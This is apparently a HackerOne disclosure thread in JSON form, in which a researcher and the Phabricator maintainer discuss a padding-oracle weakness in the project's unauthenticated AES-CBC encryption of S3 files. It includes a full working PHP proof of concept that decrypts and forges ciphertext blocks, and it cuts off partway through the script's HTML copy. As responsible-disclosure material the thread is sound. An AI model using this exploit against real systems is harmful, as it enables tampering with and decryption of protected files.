**2.2 (Low)** [2]\n\nThe attack scenarios are all hard to pull off (`AC:H`) and the attacker requires high privileges in order to mount the attack (`PR:H`).\n\n\u003e Can you construct a more concerning attack?\n\nNo. I can only make the two first steps easier with the false sense of security and possibly combining other vulnerabilities. \n\nAfter doing a little research I found a similar [report](https://hackerone.com/reports/108082) that still requires high user privileges, but demonstrates bit flipping an executable fairly well. Please note that the payload would still only be 16 bytes in CBC mode. What do you think? Is this still impractical?\n\n\u003e Do you think the attack I describe above is actually more concerning than I'm assessing it to be?\n\nAs stated earlier, while still not a serious issue (2.2 (Low)), the severity of the issue is not `None` and therefore I believe this should be addressed accordingly (Low priority).\n\nOnce again, thank you very much for helping me understand the issue. Do you mind if I give you a shout out on Twitter? :)","markdown_message":"\u003cp\u003e\u003cstrong\u003eThat is hands down the best response I have ever had from a bug bounty report. Thank you for taking the time to explain everything thoroughly.\u003c/strong\u003e I will brake my response down and address individual parts of your response.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eStoring file blobs encrypted in S3 protects these installs against attacks by AWS employees or attackers who can mount an attack on an AWS datacenter directly (in an extreme case, state actors storming an AWS facility and taking hardware by force). This encryption reduces the amount of trust which needs to be placed in S3/AWS.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eOK, so while very unlikely, a rogue AWS employee could potentially exploit this vulnerability without having to have access to the victim\u0026#39;s Phabricator account.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eIn other cases, installs don\u0026#39;t actually care about security or any specific attack, but have a policy which requires or encourages data to be stored encrypted. In these cases, the feature need not provide any actual security benefit, just satisfy the letter of the policy. Installs which have expressed interest in encryption from this angle have generally not actually cared that the encryption is provable, secure, observable, or even that it protects against any specific attack scenario: they\u0026#39;re just following a policy that says encryption is good.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eThis raises a new issue for me. Although Phabricator is not directly to blame here, no encryption is almost better than \u0026quot;bad\u0026quot; encryption, since this could potentially give another user (keep in mind I am using the term user to define somebody setting up their own installation of Phabricator) a false sense of security. I will come back to this later on. [1]\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eWe have not implemented the feature to address these cases, although we\u0026#39;ve probably seen more of these cases than \u0026quot;S3 vs Trusted Datacenter\u0026quot; cases. Particularly, we specifically avoided implementing the unprovable \u0026quot;encrypt data\u0026quot; S3 checkbox that AWS offers (you can find some discussion in \u003ca title=\"https://secure.phabricator.com/D10176\" href=\"/redirect?url=https%3A%2F%2Fsecure.phabricator.com%2FD10176\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://secure.phabricator.com/D10176\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) in favor of a scheme which at least protects against some set of attackers, however implausible it may be that Chinese commandos are going to storm an AWS datacenter.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eFair enough.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eI think there may be a legitimate -- if somewhat far-fetched -- attack here: [...]\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eI will come back to this when reevaluating the severity of the issue. [2]\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eAn employee might more reasonably have an account and be able to gain AWS credentials to access S3. These credentials should normally be stored alongside the keyring and subject to the same security protocols, but realistically installs probably use AWS for more things than Phabricator and may not set up single-use credentials for it. In most cases this probably boils down to a social engineering attack where the major compromise is convincing a privileged coworker to run a binary. Perhaps this oracle-based approach could tip the balance and let this attack succeed where it would otherwise fail, but I don\u0026#39;t think routine workflows normally lead users to regularly execute binaries from Phabricator or place any particular trust in them.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eSo this is where I go back to [1]. If I understood correctly you only mention social engineering an AWS employee, but I believe the false sense of security could mean that the attacker may have an easier time trying to trick the user.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eWhether this attack is actually possible or not, I think checksumming blobs is probably worth implementing anyway. It may not really defuse any attack here, but there\u0026#39;s some value in just having an integrity checksum and it\u0026#39;s not particularly difficult to implement.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eThis is a very good idea, but at the same time you should add an authentication mechanism. Some users may ignore checksum mismatches and completely rely on the decryption process ensuring integrity.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eBut I\u0026#39;d like better evidence that this attack represents a real threat rather than a purely theoretical one before prioritizing this as a security issue.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eFinally, I am still confident that this issues could be exploited in combination with other issues, such as the false sense of security. Therefore, to help you prioritise this security issue we should use the following CVSS score: \u003ccode\u003eCVSS:3.0/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:L/A:N\u003c/code\u003e -\u0026gt; \u003cstrong\u003e2.2 (Low)\u003c/strong\u003e [2]\u003c/p\u003e\n\n\u003cp\u003eThe attack scenarios are all hard to pull off (\u003ccode\u003eAC:H\u003c/code\u003e) and the attacker requires high privileges in order to mount the attack (\u003ccode\u003ePR:H\u003c/code\u003e).\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eCan you construct a more concerning attack?\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eNo. I can only make the two first steps easier with the false sense of security and possibly combining other vulnerabilities. \u003c/p\u003e\n\n\u003cp\u003eAfter doing a little research I found a similar \u003ca href=\"https://hackerone.com/reports/108082\"\u003ereport\u003c/a\u003e that still requires high user privileges, but demonstrates bit flipping an executable fairly well. Please note that the payload would still only be 16 bytes in CBC mode. What do you think? Is this still impractical?\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eDo you think the attack I describe above is actually more concerning than I\u0026#39;m assessing it to be?\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eAs stated earlier, while still not a serious issue (2.2 (Low)), the severity of the issue is not \u003ccode\u003eNone\u003c/code\u003e and therefore I believe this should be addressed accordingly (Low priority).\u003c/p\u003e\n\n\u003cp\u003eOnce again, thank you very much for helping me understand the issue. Do you mind if I give you a shout out on Twitter? :)\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-29T17:01:15.697Z","updated_at":"2017-03-29T17:01:56.473Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1571156,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003e Although Phabricator is not directly to blame here, no encryption is almost better than \"bad\" encryption, since this could potentially give another user (keep in mind I am using the term user to define somebody setting up their own installation of Phabricator) a false sense of security.\n\nAgreed. (This is why I resisted implementing the unprovable S3 \"Encryption\" header.)\n\n\u003e OK, so while very unlikely, a rogue AWS employee could potentially exploit this vulnerability without having to have access to the victim's Phabricator account.\n\nI think they can't realistically build a poisoned ciphertext because we operate in CBC mode -- see below.\n\n\u003e This is a very good idea, but at the same time you should add an authentication mechanism. Some users may ignore checksum mismatches and completely rely on the decryption process ensuring integrity.\n\nOh, I think we're talking about the same thing: I mean that we would store an HMAC hash of each chunk of file data when writing, and refuse to decrypt it if the hash of the ciphertext we read did not match the stored hash (that is, \"Encrypt-then-MAC\").\n\nOn hash mismatch, we'd give the user an error message (like \"This file has been corrupted or tampered with and can not be read.\"). We wouldn't just tell users to manually compare checksums, since I agree that almost no one would do that.\n\n\u003e After doing a little research I found a similar report that still requires high user privileges, but demonstrates bit flipping an executable fairly well. Please note that the payload would still only be 16 bytes in CBC mode. What do you think? Is this still impractical?\n\nI *think* this attack relies on CFB mode, and won't work in CBC mode? In CBC mode, I think you have to search through the entire space for the block and that having a padding oracle doesn't help you, because a one-bit change in the ciphertext cascades to the entire plaintext output block. I may be misunderstanding or unaware of an attack which allows you to reduce the search space, but my belief is that:\n\n  - Given a ciphertext which you want to corrupt, you have to search 2^128 inputs to find a ciphertext which decrypts to a plaintext with 16 chosen bytes if the encryption uses CBC mode with 128-bit blocks.\n  - Having access to a padding oracle doesn't help you narrow down this search space.\n  - In CFB mode (instead of CBC mode), this search is trivial (bit operations on the ciphertext directly impact the decrypted plaintext, so you can construct the poisoned ciphertext directly), which is why the linked attack is realistic.\n\nAssuming I'm not missing anything, you have to search a huge space because we use CBC, and the oracle doesn't help you do this, and verifying a candidate ciphertext takes 100ms+ even if you have a Phabricator account (you have to make an HTTP request and get a response). So I don't think a users with access to S3 or an AWS employee can realistically build a poisoned ciphertext before the heat death of the universe.\n\nMaybe you can compromise S3 and an account, and find a way to tamper with a binary so you only need to change a few bits, and can arrange things so those bits appear at the beginning of a block, and the binary format allows you to corrupt the rest of the file. Then you could verify your poisoned ciphertext in a realistic amount of time. This seems like a very high barrier, but perhaps not an insurmountable one.\n\nOr maybe this attack is easier than I think, but I *believe* using CBC mode makes us mostly resistant to it.\n\nIf users really can blindly construct a chosen plaintext without searching a huge input space, I'd consider this attack sufficiently realistic to place high priority on fixing it in the short term.\n\n\u003e Once again, thank you very much for helping me understand the issue. Do you mind if I give you a shout out on Twitter?\n\nSure. I'm also happy to disclose this as soon as we agree about the remaining details, I just want to make sure I'm not missing anything.","markdown_message":"\u003cblockquote\u003e\n\u003cp\u003eAlthough Phabricator is not directly to blame here, no encryption is almost better than \u0026quot;bad\u0026quot; encryption, since this could potentially give another user (keep in mind I am using the term user to define somebody setting up their own installation of Phabricator) a false sense of security.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eAgreed. (This is why I resisted implementing the unprovable S3 \u0026quot;Encryption\u0026quot; header.)\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eOK, so while very unlikely, a rogue AWS employee could potentially exploit this vulnerability without having to have access to the victim\u0026#39;s Phabricator account.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eI think they can\u0026#39;t realistically build a poisoned ciphertext because we operate in CBC mode -- see below.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eThis is a very good idea, but at the same time you should add an authentication mechanism. Some users may ignore checksum mismatches and completely rely on the decryption process ensuring integrity.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eOh, I think we\u0026#39;re talking about the same thing: I mean that we would store an HMAC hash of each chunk of file data when writing, and refuse to decrypt it if the hash of the ciphertext we read did not match the stored hash (that is, \u0026quot;Encrypt-then-MAC\u0026quot;).\u003c/p\u003e\n\n\u003cp\u003eOn hash mismatch, we\u0026#39;d give the user an error message (like \u0026quot;This file has been corrupted or tampered with and can not be read.\u0026quot;). We wouldn\u0026#39;t just tell users to manually compare checksums, since I agree that almost no one would do that.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eAfter doing a little research I found a similar report that still requires high user privileges, but demonstrates bit flipping an executable fairly well. Please note that the payload would still only be 16 bytes in CBC mode. What do you think? Is this still impractical?\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eI \u003cem\u003ethink\u003c/em\u003e this attack relies on CFB mode, and won\u0026#39;t work in CBC mode? In CBC mode, I think you have to search through the entire space for the block and that having a padding oracle doesn\u0026#39;t help you, because a one-bit change in the ciphertext cascades to the entire plaintext output block. I may be misunderstanding or unaware of an attack which allows you to reduce the search space, but my belief is that:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eGiven a ciphertext which you want to corrupt, you have to search 2^128 inputs to find a ciphertext which decrypts to a plaintext with 16 chosen bytes if the encryption uses CBC mode with 128-bit blocks.\u003c/li\u003e\n\u003cli\u003eHaving access to a padding oracle doesn\u0026#39;t help you narrow down this search space.\u003c/li\u003e\n\u003cli\u003eIn CFB mode (instead of CBC mode), this search is trivial (bit operations on the ciphertext directly impact the decrypted plaintext, so you can construct the poisoned ciphertext directly), which is why the linked attack is realistic.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eAssuming I\u0026#39;m not missing anything, you have to search a huge space because we use CBC, and the oracle doesn\u0026#39;t help you do this, and verifying a candidate ciphertext takes 100ms+ even if you have a Phabricator account (you have to make an HTTP request and get a response). So I don\u0026#39;t think a users with access to S3 or an AWS employee can realistically build a poisoned ciphertext before the heat death of the universe.\u003c/p\u003e\n\n\u003cp\u003eMaybe you can compromise S3 and an account, and find a way to tamper with a binary so you only need to change a few bits, and can arrange things so those bits appear at the beginning of a block, and the binary format allows you to corrupt the rest of the file. Then you could verify your poisoned ciphertext in a realistic amount of time. This seems like a very high barrier, but perhaps not an insurmountable one.\u003c/p\u003e\n\n\u003cp\u003eOr maybe this attack is easier than I think, but I \u003cem\u003ebelieve\u003c/em\u003e using CBC mode makes us mostly resistant to it.\u003c/p\u003e\n\n\u003cp\u003eIf users really can blindly construct a chosen plaintext without searching a huge input space, I\u0026#39;d consider this attack sufficiently realistic to place high priority on fixing it in the short term.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eOnce again, thank you very much for helping me understand the issue. Do you mind if I give you a shout out on Twitter?\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eSure. I\u0026#39;m also happy to disclose this as soon as we agree about the remaining details, I just want to make sure I\u0026#39;m not missing anything.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-29T18:13:48.390Z","updated_at":"2017-03-29T18:13:48.390Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1573170,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003e Oh, I think we're talking about the same thing: I mean that we would store an HMAC hash of each chunk of file data when writing, and refuse to decrypt it if the hash of the ciphertext we read did not match the stored hash (that is, \"Encrypt-then-MAC\").\n\nOh, I see. Encrypt-then-MAC is authenticated encryption so that would solve this problem.\n\n\u003e In CBC mode, I think you have to search through the entire space for the block and that having a padding oracle doesn't help you, because a one-bit change in the ciphertext cascades to the entire plaintext output block.\n\nCorrect. Bit flipping a CBC block will cause an avalanche effect.\n\n\u003e I may be misunderstanding or unaware of an attack which allows you to reduce the search space [...]\n\nYou can optimise a padding oracle attack. Please keep in mind that all that is needed to perform this type of attack are two consecutive blocks.\n\n* `C′[i]` is the final byte in the `C′` block, which we are sending to the oracle.\n* `P[i]` is the last byte in this block's plaintext, which we have solved for already.\n\nInstead of choosing values for `C′[i]`, you can choose the value for `P[i]` that you want to guess, then solve for `C′[i]`.\n\nOn top of that, this can also be optimised for ASCII text.\n\n\u003e Assuming I'm not missing anything, you have to search a huge space because we use CBC, and the oracle doesn't help you do this, and verifying a candidate ciphertext takes 100ms+ even if you have a Phabricator account (you have to make an HTTP request and get a response). So I don't think a users with access to S3 or an AWS employee can realistically build a poisoned ciphertext before the heat death of the universe.\n\nBy optimising the attack as described above, this should not take too long and is doable.\n\n\u003e Or maybe this attack is easier than I think, but I believe using CBC mode makes us mostly resistant to it.\n\nActually, here is an interesting bit of trivia, padding oracle attacks were originally known as Vaudenay attacks. [Serge Vaudenay](https://lasec.epfl.ch/php_code/publications/search.php?ref=Vau02a) believed that this type of attack was only possible with CBC mode. So CBC padding oracle attacks are far better documented that any other mode.","markdown_message":"\u003cblockquote\u003e\n\u003cp\u003eOh, I think we\u0026#39;re talking about the same thing: I mean that we would store an HMAC hash of each chunk of file data when writing, and refuse to decrypt it if the hash of the ciphertext we read did not match the stored hash (that is, \u0026quot;Encrypt-then-MAC\u0026quot;).\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eOh, I see. Encrypt-then-MAC is authenticated encryption so that would solve this problem.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eIn CBC mode, I think you have to search through the entire space for the block and that having a padding oracle doesn\u0026#39;t help you, because a one-bit change in the ciphertext cascades to the entire plaintext output block.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eCorrect. Bit flipping a CBC block will cause an avalanche effect.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eI may be misunderstanding or unaware of an attack which allows you to reduce the search space [...]\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eYou can optimise a padding oracle attack. Please keep in mind that all that is needed to perform this type of attack are two consecutive blocks.\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003ccode\u003eC′[i]\u003c/code\u003e is the final byte in the \u003ccode\u003eC′\u003c/code\u003e block, which we are sending to the oracle.\u003c/li\u003e\n\u003cli\u003e\n\u003ccode\u003eP[i]\u003c/code\u003e is the last byte in this block\u0026#39;s plaintext, which we have solved for already.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eInstead of choosing values for \u003ccode\u003eC′[i]\u003c/code\u003e, you can choose the value for \u003ccode\u003eP[i]\u003c/code\u003e that you want to guess, then solve for \u003ccode\u003eC′[i]\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eOn top of that, this can also be optimised for ASCII text.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eAssuming I\u0026#39;m not missing anything, you have to search a huge space because we use CBC, and the oracle doesn\u0026#39;t help you do this, and verifying a candidate ciphertext takes 100ms+ even if you have a Phabricator account (you have to make an HTTP request and get a response). So I don\u0026#39;t think a users with access to S3 or an AWS employee can realistically build a poisoned ciphertext before the heat death of the universe.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eBy optimising the attack as described above, this should not take too long and is doable.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eOr maybe this attack is easier than I think, but I believe using CBC mode makes us mostly resistant to it.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eActually, here is an interesting bit of trivia, padding oracle attacks were originally known as Vaudenay attacks. \u003ca href=\"/redirect?url=https%3A%2F%2Flasec.epfl.ch%2Fphp_code%2Fpublications%2Fsearch.php%3Fref%3DVau02a\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eSerge Vaudenay\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e believed that this type of attack was only possible with CBC mode. So CBC padding oracle attacks are far better documented that any other mode.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-30T15:30:47.774Z","updated_at":"2017-03-30T15:30:47.774Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1573568,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"After fiddling for an hour or two I was able to actually poison ciphertext in practice, which convinces me that this attack is viable in CBC mode. This is not the world's cleanest proof-of-concept, but the shape of the attack is as described above:\n\n  - We use the oracle to discover the plaintext in the second block (in Phabricator, this is not necessary because you can read the plaintext if you can query the oracle, but an oracle plus the ciphertext is sufficient in the general case).\n  - We use the oracle and the discovered plaintext to poison the second block so it decrypts to chosen plaintext.\n  - Although this script doesn't demonstrate it, I believe we can continue working backward to poison an arbitrarily long suffix of the file (but not the entire file).\n  - We end up with one block of garbage which we can not control before any sections we poison, but it's reasonable that this may be acceptable (the ownCloud example is illustrative). I think getting rid of this garbage block is legitimately hard (you really have to search the whole space) but attackers can just build attacks where this doesn't matter.\n  - In the worst case, we only need ~4,000 queries to the oracle per 16-byte block, which is a realistic number of queries to execute even against a network oracle to meaningfully poison a file.\n\nI think there are still a lot of barriers to overcome, but this was the biggest one by a wide margin. We'll pursue a fix for this in the short term. Since this involves a migration and there's some adjacent work in Files I'm not sure I'll get it done in time for the weekly release (in about 30 hours from now), but I'm going to try to make it if nothing else catches on fire between now and then.\n\n(I think AWS employees without accounts still can't mount this attack since they can't query the oracle.)\n\n```php\n\u003c?php\n\ndefine('CIPHER', 'aes-256-cbc');\n\n$plaintext =\n  \"AAAAAAAAAAAAAAAA\".\n  \"BBBBBBBBBBBBBBBB\".\n  \"CCCCCCCCCCCC\";\n\n$key = get_random_bytes(32);\n$iv = get_random_bytes(16);\n\nprint_section('PLAINTEXT', $plaintext);\nprint_section('KEY', $key, true);\nprint_section('IV', $iv, true);\n\n$ciphertext = openssl_encrypt($plaintext, CIPHER, $key, OPENSSL_RAW_DATA, $iv);\nif ($ciphertext === false) {\n  die('Failed to encrypt plaintext.');\n}\n\nprint_section('CIPHERTEXT', $ciphertext, true);\n\n$oracle = array(\n  'key' =\u003e $key,\n  'iv' =\u003e $iv,\n);\n\noracle_decrypt_attack($ciphertext, $oracle);\noracle_encrypt_attack($ciphertext, $plaintext, $oracle, 'ZZZZZZZZZZZZZZZZ');\n\n\nfunction oracle_decrypt_attack($ciphertext, $oracle) {\n  $blocks = str_split($ciphertext, 16);\n\n  // We're going to fiddle with the first block to find bytes in the second\n  // block.\n  $head_block = $blocks[0];\n  $tail_block = $blocks[1];\n\n  $solved_block = oracle_decrypt_attack_block(\n    $head_block,\n    $tail_block,\n    $oracle);\n\n  print_section('ORACLE DECYPT', $solved_block);\n}\n\nfunction oracle_encrypt_attack($ciphertext, $plaintext, $oracle, $evil_plain) {\n  $blocks = str_split($ciphertext, 16);\n  $head_block = $blocks[0];\n  $tail_block = $blocks[1];\n\n  $plain_blocks = str_split($plaintext, 16);\n  $head_plain = $plain_blocks[0];\n  $tail_plain = $plain_blocks[1];\n\n  $solved_block = oracle_encrypt_attack_block(\n    $head_block,\n    $tail_block,\n    $oracle,\n    $tail_plain,\n    $evil_plain);\n\n  print_section('ORACLE INPUT', $head_block, true);\n  print_section('ORACLE ENCRYPT', $solved_block, true);\n\n  // Now, construct the attack text.\n  $full_attack = $blocks;\n  $full_attack[0] = $solved_block;\n  $full_attack = implode('', $full_attack);\n\n  $key = $oracle['key'];\n  $iv = $oracle['iv'];\n  $result = openssl_decrypt($full_attack, CIPHER, $key, OPENSSL_RAW_DATA, $iv);\n  print_section('ORACLE ATTACK (RAW)', $result);\n  print_section('ORACLE ATTACK (BYTES)', $result, true);\n}\n\nfunction oracle_decrypt_attack_block(\n  $head_block,\n  $tail_block,\n  $oracle) {\n\n  echo \"Performing oracle decryption attack against target block...\\n\";\n\n  $plaintext = array_fill(0, 16, 0);\n  for ($byte = 15; $byte \u003e= 0; $byte--) {\n    $raw_value = ord($head_block[$byte]);\n    $pad_value = (16 - $byte);\n\n    $try_head = $head_block;\n\n    // If we've already guessed some plaintext bytes, first configure the\n    // end of the block to have the right values for those bytes.\n    for ($ii = 15; $ii \u003e $byte; $ii--) {\n      $attack_value = ord($head_block[$ii]) ^ $plaintext[$ii] ^ $pad_value;\n      $try_head[$ii] = chr($attack_value);\n    }\n\n    // Now, guess the last byte, using the padding oracle to verify the value\n    // for the plaintext.\n    for ($guess_byte = 0; $guess_byte \u003c= 255; $guess_byte++) {\n      $try_head[$byte] = chr($raw_value ^ $guess_byte ^ $pad_value);\n\n      $ok = query_oracle($try_head.$tail_block, $oracle);\n      if ($ok) {\n        printf(\n          \"Solved byte %d.\\n\",\n          $byte);\n        $plaintext[$byte] = $guess_byte;\n        break;\n      }\n    }\n  }\n\n  echo \"\\n\";\n\n  // Convert the plaintext back to a string and return it.\n  $result = '';\n  foreach ($plaintext as $ord) {\n    $result .= chr($ord);\n  }\n\n  return $result;\n}\n\nfunction oracle_encrypt_attack_block(\n  $head_block,\n  $tail_block,\n  $oracle,\n  $plain_block,\n  $evil_block) {\n\n  echo \"Performing oracle encryption attack against target block...\\n\";\n\n  $ciphertext = array_fill(0, 16, 0);\n  for ($byte = 15; $byte \u003e= 0; $byte--) {\n    $raw_value = ord($head_block[$byte]);\n    $pad_value = (16 - $byte);\n\n    $try_head = $head_block;\n\n    $known_value = ord($plain_block[$byte]);\n    $evil_value = ord($evil_block[$byte]);\n\n    for ($ii = 15; $ii \u003e $byte; $ii--) {\n      $attack_value =\n        ord($head_block[$ii]) ^\n        ord($plain_block[$ii]) ^\n        $pad_value;\n\n      $try_head[$ii] = chr($attack_value);\n    }\n\n    $solved = false;\n    for ($guess_byte = 0; $guess_byte \u003c= 255; $guess_byte++) {\n      $guess_value =\n        $raw_value ^\n        $guess_byte ^\n        $pad_value ^\n        $known_value ^\n        $evil_value;\n\n      $try_head[$byte] = chr($guess_value);\n\n      $ok = query_oracle($try_head.$tail_block, $oracle);\n      if ($ok) {\n        $solved = true;\n        printf(\n          \"Solved byte %d.\\n\",\n          $byte);\n\n        $ciphertext[$byte] = ord($try_head[$byte]) ^ $pad_value ^ $evil_value;\n\n        break;\n      }\n    }\n\n    if (!$solved) {\n      die(\"Unable to solve byte {$byte}.\\n\");\n    }\n  }\n\n  echo \"\\n\";\n\n  // Convert the plaintext back to a string and return it.\n  $result = '';\n  foreach ($ciphertext as $ord) {\n    $result .= chr($ord);\n  }\n\n  return $result;\n}\n\nfunction query_oracle($guess, $oracle) {\n  $key = $oracle['key'];\n  $iv = $oracle['iv'];\n  $ok = openssl_decrypt($guess, CIPHER, $key, OPENSSL_RAW_DATA, $iv);\n\n  return ($ok !== false);\n}\n\nfunction get_random_bytes($length) {\n  $src = fopen('/dev/urandom', 'rb');\n  if ($src === false) {\n    die('Failed to open /dev/urandom.');\n  }\n\n  $result = fread($src, $length);\n  if ($result === false) {\n    die('Failed to read /dev/urandom.');\n  }\n\n  fclose($src);\n\n  return $result;\n}\n\nfunction print_section($header, $body, $binary = false) {\n  echo $header;\n  echo \"\\n\";\n  if ($binary) {\n    for ($ii = 0; $ii \u003c strlen($body); $ii++) {\n      printf('0x%02x ', ord($body[$ii]));\n    }\n  } else {\n    echo $body;\n  }\n  echo \"\\n\\n\";\n}\n```","markdown_message":"\u003cp\u003eAfter fiddling for an hour or two I was able to actually poison ciphertext in practice, which convinces me that this attack is viable in CBC mode. This is not the world\u0026#39;s cleanest proof-of-concept, but the shape of the attack is as described above:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eWe use the oracle to discover the plaintext in the second block (in Phabricator, this is not necessary because you can read the plaintext if you can query the oracle, but an oracle plus the ciphertext is sufficient in the general case).\u003c/li\u003e\n\u003cli\u003eWe use the oracle and the discovered plaintext to poison the second block so it decrypts to chosen plaintext.\u003c/li\u003e\n\u003cli\u003eAlthough this script doesn\u0026#39;t demonstrate it, I believe we can continue working backward to poison an arbitrarily long suffix of the file (but not the entire file).\u003c/li\u003e\n\u003cli\u003eWe end up with one block of garbage which we can not control before any sections we poison, but it\u0026#39;s reasonable that this may be acceptable (the ownCloud example is illustrative). I think getting rid of this garbage block is legitimately hard (you really have to search the whole space) but attackers can just build attacks where this doesn\u0026#39;t matter.\u003c/li\u003e\n\u003cli\u003eIn the worst case, we only need ~4,000 queries to the oracle per 16-byte block, which is a realistic number of queries to execute even against a network oracle to meaningfully poison a file.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eI think there are still a lot of barriers to overcome, but this was the biggest one by a wide margin. We\u0026#39;ll pursue a fix for this in the short term. Since this involves a migration and there\u0026#39;s some adjacent work in Files I\u0026#39;m not sure I\u0026#39;ll get it done in time for the weekly release (in about 30 hours from now), but I\u0026#39;m going to try to make it if nothing else catches on fire between now and then.\u003c/p\u003e\n\n\u003cp\u003e(I think AWS employees without accounts still can\u0026#39;t mount this attack since they can\u0026#39;t query the oracle.)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\n\u003cspan class=\"nb\"\u003edefine\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;CIPHER\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;aes-256-cbc\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$plaintext\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\n  \u003cspan class=\"s2\"\u003e\u0026quot;AAAAAAAAAAAAAAAA\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\n  \u003cspan class=\"s2\"\u003e\u0026quot;BBBBBBBBBBBBBBBB\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\n  \u003cspan class=\"s2\"\u003e\u0026quot;CCCCCCCCCCCC\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$key\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eget_random_bytes\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e32\u003c/span\u003e\u003cspan 